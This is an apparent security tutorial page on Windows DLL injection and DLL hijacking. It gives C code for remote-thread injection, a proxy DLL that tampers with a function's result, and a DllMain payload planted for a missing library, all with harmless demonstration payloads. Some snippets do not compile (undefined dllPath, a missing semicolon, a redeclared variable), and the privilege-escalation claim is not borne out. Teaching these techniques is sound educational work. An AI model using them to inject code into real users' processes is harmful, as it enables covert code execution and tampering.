# DLL Injection

## LoadLibrary

LoadLibrary is a widely utilized method for DLL injection

```c
#include <windows.h>
#include <stdio.h>

int main() {
    // Using LoadLibrary to load a DLL into the current process
    HMODULE hModule = LoadLibrary("example.dll");
    if (hModule == NULL) {
        printf("Failed to load example.dll\n");
        return -1;
    }
    printf("Successfully loaded example.dll\n");

    return 0;
}
```

The first example shows how LoadLibrary can be used to load a DLL into the current process legitimately.

```c
#include <windows.h>
#include <stdio.h>

int main() {
    // Using LoadLibrary for DLL injection
    // First, we need to get a handle to the target process
    DWORD targetProcessId = 123456 // The ID of the target process
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetProcessId);
    if (hProcess == NULL) {
        printf("Failed to open target process\n");
        return -1;
    }

    // Next, we need to allocate memory in the target process for the DLL path
    LPVOID dllPathAddressInRemoteMemory = VirtualAllocEx(hProcess, NULL, strlen(dllPath), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if (dllPathAddressInRemoteMemory == NULL) {
        printf("Failed to allocate memory in target process\n");
        return -1;
    }

    // Write the DLL path to the allocated memory in the target process
    BOOL succeededWriting = WriteProcessMemory(hProcess, dllPathAddressInRemoteMemory, dllPath, strlen(dllPath), NULL);
    if (!succeededWriting) {
        printf("Failed to write DLL path to target process\n");
        return -1;
    }

    // Get the address of LoadLibrary in kernel32.dll
    LPVOID loadLibraryAddress = (LPVOID)GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
    if (loadLibraryAddress == NULL) {
        printf("Failed to get address of LoadLibraryA\n");
        return -1;
    }

    // Create a remote thread in the target process that starts at LoadLibrary and points to the DLL path
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)loadLibraryAddress, dllPathAddressInRemoteMemory, 0, NULL);
    if (hThread == NULL) {
        printf("Failed to create remote thread in target process\n");
        return -1;
    }

    printf("Successfully injected example.dll into target process\n");

    return 0;
}

```

The second example illustrates the use of _LoadLibrary_ for DLL injection. This process involves allocating memory within the target process for the DLL path and then initiating a remote thread that begins at LoadLibrary and directs towards the DLL path.

## Reflective DLL Injection

[Stephen Fewer has a great GitHub](https://github.com/stephenfewer/ReflectiveDLLInjection)

## DLL Hijacking

DLL Hijacking is an exploitation technique where an attacker capitalizes on the Windows DLL loading process. These DLLs can be loaded during runtime, creating a hijacking opportunity if an application doesn't specify the full path to a required DLL, hence rendering it susceptible to such attacks.

The default DLL search order used by the system depends on whether _Safe DLL Search Mode_ is activated

* The directory from which the application is loaded.
* The system directory.
* The 16-bit system directory.
* The Windows directory.
* The current directory.
* The directories that are listed in the PATH environment variable.

However, if 'Safe DLL Search Mode' is deactivated, the search order changes to:

* The directory from which the application is loaded.
* The current directory.
* The system directory.
* The 16-bit system directory.
* The Windows directory
* The directories that are listed in the PATH environment variable

DLL Hijacking involves a few more steps. First, you need to pinpoint a DLL the target is attempting to locate. Specific tools can simplify this task:

1. Process Explorer: Part of Microsoft's Sysinternals suite, this tool offers detailed information on running processes, including their loaded DLLs. By selecting a process and inspecting its properties, you can view its DLLs.
2. PE Explorer: This Portable Executable (PE) Explorer can open and examine a PE file (such as a .exe or .dll). Among other features, it reveals the DLLs from which the file imports functionality.

Consider this c program:

```c
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <windows.h>

typedef int (*AddFunc)(int, int);

int readIntegerInput()
{
    int value;
    char input[100];
    bool isValid = false;

    while (!isValid)
    {
        fgets(input, sizeof(input), stdin);

        if (sscanf(input, "%d", &value) == 1)
        {
            isValid = true;
        }
        else
        {
            printf("Invalid input. Please enter an integer: ");
        }
    }

    return value;
}

int main()
{
    HMODULE hLibrary = LoadLibrary("library.dll");
    if (hLibrary == NULL)
    {
        printf("Failed to load library.dll\n");
        return 1;
    }

    AddFunc add = (AddFunc)GetProcAddress(hLibrary, "Add");
    if (add == NULL)
    {
        printf("Failed to locate the 'Add' function\n");
        FreeLibrary(hLibrary);
        return 1;
    }
    HMODULE hLibrary = LoadLibrary("x.dll");

    printf("Enter the first number: ");
    int a = readIntegerInput();

    printf("Enter the second number: ");
    int b = readIntegerInput();

    int result = add(a, b);
    printf("The sum of %d and %d is %d\n", a, b, result);

    FreeLibrary(hLibrary);
    system("pause");
    return 0;
}
```

It loads add function from _library.dll_

First, let's set up a filter in _procmon_ to solely include _main.exe_, which is the process name of the program. This filter will help us focus specifically on the activities related to the execution of main.exe. It is important to note that procmon only captures information while it is actively running. Therefore, if your log appears empty, you should close main.exe and reopen it while procmon is running. This will ensure that the necessary information is captured and available for analysis.

<figure><img src="../../../.gitbook/assets/DLL Injection.png" alt=""><figcaption></figcaption></figure>

Then if you scroll to the bottom, you can see the call to load library.dll.&#x20;

<figure><img src="../../../.gitbook/assets/DLL Injection-1.png" alt=""><figcaption></figcaption></figure>

&#x20;We can further filter for an Operation of Load Image to only get the libraries the app is loading.

## Proxying

We can utilize a method known as DLL Proxying to execute a Hijack. We will create a new library that will load the function Add from _library.dll_, tamper with it, and then return it to _main.exe_.

Steps:

* _Create a new library_: We will create a new library serving as the proxy for library.dll. This library will contain the necessary code to load the Add function from library.dll and perform the required tampering.
* _Load the Add function_: Within the new library, we will load the Add function from the original library.dll. This will allow us to access the original function.
* _Tamper with the function_: Once the Add function is loaded, we can then apply the desired tampering or modifications to its result. In this case, we are simply going to modify the result of the addition, to add + 1 to the result.
* _Return the modified function_: After completing the tampering process, we will return the modified Add function from the new library back to main.exe. This will ensure that when main.exe calls the Add function, it will execute the modified version with the intended changes. Code:

```c
// tamper.c
#include <stdio.h>
#include <Windows.h>

#ifdef _WIN32
#define DLL_EXPORT __declspec(dllexport)
#else
#define DLL_EXPORT
#endif

typedef int (*AddFunc)(int, int);

DLL_EXPORT int Add(int a, int b)
{
    // Load the original library containing the Add function
    HMODULE originalLibrary = LoadLibraryA("library.o.dll");
    if (originalLibrary != NULL)
    {
        // Get the address of the original Add function from the library
        AddFunc originalAdd = (AddFunc)GetProcAddress(originalLibrary, "Add");
        if (originalAdd != NULL)
        {
            printf("============ HIJACKED ============\n");
            // Call the original Add function with the provided arguments
            int result = originalAdd(a, b);
            // Tamper with the result by adding +1
            printf("= Adding 1 to the sum to be evil\n");
            result += 1;
            printf("============ RETURN ============\n");
            // Return the tampered result
            return result;
        }
    }
    // Return -1 if the original library or function cannot be loaded
    return -1;
}

```

Either compile it or use the precompiled version provided. Rename library.dll to library.o.dll, and rename tamper.dll to library.dll. Then run main.exe to privilege escalate.

### Invalid Libraries

Another option to execute a DLL Hijack attack is to replace a valid library the program is attempting to load but cannot find with a crafted library. If we change the procmon filter to focus on entries whose path ends in .dll and has a status of NAME NOT FOUND we can find such libraries in main.exe.&#x20;

<figure><img src="../../../.gitbook/assets/DLL Injection-2.png" alt=""><figcaption></figcaption></figure>

It looks for x.dll and its not present so we can create our own x.dll:

```c
#include <stdio.h>
#include <Windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    {
        printf("Hijacked... Oops...\n");
    }
    break;
    case DLL_PROCESS_DETACH:
        break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    }
    return TRUE;
}

```

This code defines a DLL entry point function called _DllMain_ that is automatically called by Windows when the DLL is loaded into a process. When the library is loaded, it will simply print Hijacked... Oops... to the terminal, but you could theoretically do anything here.
